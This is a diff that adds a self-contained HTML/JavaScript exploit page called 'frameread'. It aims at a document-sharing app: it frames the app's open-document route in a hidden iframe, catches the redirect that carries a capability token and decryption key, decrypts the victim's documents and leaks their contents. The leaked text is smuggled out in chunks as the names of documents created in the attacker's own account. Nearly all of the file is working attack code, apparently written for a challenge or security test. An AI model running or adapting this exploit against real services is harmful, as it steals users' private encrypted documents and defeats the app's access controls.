@@ -1,0 +1,151 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>fr</title>
+<pre id="log">frameread boot
+</pre>
+<script>
+"use strict";
+// Injected at build time by framebuild.py
+const CFG = /*@@CFG@@*/ {"tag": "dev", "token": "", "targets": [], "app": "https://ariadnetab.xyz", "content": "https://content.ariadnetab.xyz", "lanes": 8, "deadline": 40000};
+
+const out = document.getElementById("log");
+const lines = [];
+function log(msg) {
+  lines.push(`${Date.now() - T0}|${msg}`);
+  out.textContent = lines.join("\n");
+}
+const T0 = Date.now();
+
+// ---------------------------------------------------------------- exfiltration
+// The page cannot reach logcat and we may have no third-party host, so results
+// come back by creating a document in OUR OWN account and reading it later with
+// documents/list. CORS on the app origin explicitly allows this origin.
+async function exfil(name, body) {
+  if (!CFG.token) return;
+  try {
+    const key = await crypto.subtle.generateKey({name: "AES-GCM", length: 256}, true, ["encrypt"]);
+    const iv = crypto.getRandomValues(new Uint8Array(12));
+    const ct = await crypto.subtle.encrypt({name: "AES-GCM", iv, tagLength: 128}, key,
+                                           new TextEncoder().encode(body));
+    // wrapped_key must be exactly 384 bytes; a random filler keeps the model valid
+    // because we never need to decrypt this one, we read it back by NAME.
+    const filler = crypto.getRandomValues(new Uint8Array(384));
+    const b64 = (b) => btoa(String.fromCharCode(...new Uint8Array(b)));
+    await fetch(`${CFG.app}/api/documents/create`, {
+      method: "POST",
+      keepalive: true,
+      headers: {Authorization: `Bearer ${CFG.token}`, "Content-Type": "application/json"},
+      body: JSON.stringify({
+        name: name.slice(0, 255),
+        mime_type: "text/plain",
+        ciphertext: b64(ct), iv: b64(iv), wrapped_key: b64(filler)
+      })
+    });
+  } catch (error) {
+    log(`exfil fail ${error}`);
+  }
+}
+
+// The document NAME is the channel: it survives without any key exchange.
+async function report(text) {
+  const chunk = 200;
+  for (let i = 0; i * chunk < text.length; i += 1) {
+    await exfil(`${CFG.tag}|${i}|${text.slice(i * chunk, (i + 1) * chunk)}`, "x");
+  }
+}
+
+// ---------------------------------------------------------------- crypto
+function b64urlToBytes(value) {
+  const b64 = value.replaceAll("-", "+").replaceAll("_", "/")
+    .padEnd(Math.ceil(value.length / 4) * 4, "=");
+  return Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
+}
+function b64ToBytes(value) {
+  return Uint8Array.from(atob(value), (c) => c.charCodeAt(0));
+}
+
+async function renderAndDecrypt(cap, rawKey) {
+  const response = await fetch(`${CFG.app}/api/render`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({cap})
+  });
+  if (!response.ok) throw new Error(`render ${response.status}`);
+  const envelope = await response.json();
+  const key = await crypto.subtle.importKey("raw", rawKey, "AES-GCM", false, ["decrypt"]);
+  const plain = await crypto.subtle.decrypt(
+    {name: "AES-GCM", iv: b64ToBytes(envelope.iv), tagLength: 128},
+    key, b64ToBytes(envelope.ciphertext));
+  return {mime: envelope.mime_type, text: new TextDecoder().decode(plain)};
+}
+
+// ---------------------------------------------------------------- the primitive
+// Frame the app origin at #/open/<uuid>.  app.js runs there with the bot's
+// localStorage.  On success it location.replace()s the FRAME onto our own
+// origin with cap and key in the fragment, at which point we can read it.
+function probe(uuid, budgetMs) {
+  return new Promise((resolve) => {
+    const frame = document.createElement("iframe");
+    frame.style.cssText = "width:1px;height:1px;border:0;position:absolute;left:-9999px";
+    frame.src = `${CFG.app}/#/open/${uuid}`;
+    document.body.appendChild(frame);
+
+    const started = Date.now();
+    const timer = setInterval(() => {
+      let href = null;
+      try {
+        href = frame.contentWindow.location.href;   // throws while cross-origin
+      } catch (error) {
+        href = null;
+      }
+      if (href && href.startsWith(`${CFG.content}/`)) {
+        clearInterval(timer);
+        const hash = new URLSearchParams(href.split("#")[1] || "");
+        frame.remove();
+        resolve({uuid, ok: true, cap: hash.get("cap"), key: hash.get("key"), ms: Date.now() - started});
+        return;
+      }
+      if (Date.now() - started > budgetMs) {
+        clearInterval(timer);
+        frame.remove();
+        resolve({uuid, ok: false, ms: Date.now() - started});
+      }
+    }, 50);
+  });
+}
+
+async function run() {
+  log(`targets=${CFG.targets.length} lanes=${CFG.lanes}`);
+  const queue = CFG.targets.slice();
+  const hits = [];
+
+  async function lane() {
+    while (queue.length) {
+      const uuid = queue.shift();
+      const result = await probe(uuid, CFG.deadline);
+      if (!result.ok) {
+        log(`miss ${uuid} ${result.ms}ms`);
+        continue;
+      }
+      log(`HIT ${uuid} ${result.ms}ms cap=${(result.cap || "").slice(0, 24)}...`);
+      hits.push(result);
+      try {
+        const doc = await renderAndDecrypt(result.cap, b64urlToBytes(result.key));
+        log(`PLAIN ${uuid} ${doc.mime} ${doc.text.length}b`);
+        log(`BODY ${doc.text.slice(0, 400)}`);
+        await report(`HIT ${uuid} ${doc.mime} ${doc.text.slice(0, 600)}`);
+      } catch (error) {
+        log(`decrypt fail ${error}`);
+        await report(`HITNODEC ${uuid} cap=${result.cap} key=${result.key}`);
+      }
+    }
+  }
+
+  await Promise.all(Array.from({length: Math.min(CFG.lanes, CFG.targets.length)}, lane));
+  log(`done hits=${hits.length}`);
+  await report(`DONE hits=${hits.length} lines=${lines.length}`);
+  document.title = `fr-done-${hits.length}`;
+}
+
+run().catch((error) => log(`fatal ${error}`));
+</script>
